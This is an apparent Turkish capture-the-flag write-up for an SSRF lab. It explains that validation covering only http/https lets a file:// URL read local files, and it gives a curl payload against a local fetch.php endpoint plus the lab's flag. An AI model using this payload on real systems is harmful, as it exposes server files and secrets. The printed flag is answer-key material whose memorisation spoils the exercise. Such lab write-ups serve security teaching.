# SSRF Lab 3 (Zor) - Çözüm

## Amaç
Gizli dosyayı sunucu dosya sisteminden doğrudan okumak.

## Neden Çalışıyor
IP kontrolleri yalnızca `http`/`https` için uygulanıyor. `file://` şemasında host yok, bu yüzden doğrulama atlanıyor ve cURL yerel dosyaları okuyabiliyor.

## Adımlar
1. Diskteki gizli dosyayı işaret eden bir `file://` URL’i kullanın.
2. Fetch uç noktasına isteği gönderip yanıtı okuyun.

## Örnek Payload
```bash
curl "http://localhost:8083/fetch.php?url=file:///var/www/html/secret.txt"
```

## Flag
AltaySec{ssrf_lab_zor_tamamlandi}
